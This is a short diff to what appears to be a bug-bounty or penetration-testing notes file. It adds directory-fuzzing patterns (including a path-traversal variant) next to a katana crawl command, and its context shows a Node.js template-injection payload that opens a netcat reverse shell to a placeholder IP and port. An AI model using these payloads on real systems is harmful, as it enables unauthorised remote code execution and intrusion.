@@ -26,6 +26,15 @@ site:*.google.-*.* -> (good results)
 
 `katana -u https://test.com -jc -d 2 | grep ".js$" | uniq | sort > js.txt`
 
+3-fuzz
+Finding hidden directory’s 
+```
+/.FUZZ
+/-FUZZ
+/~FUZZ
+/../FuZZ
+```
+
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
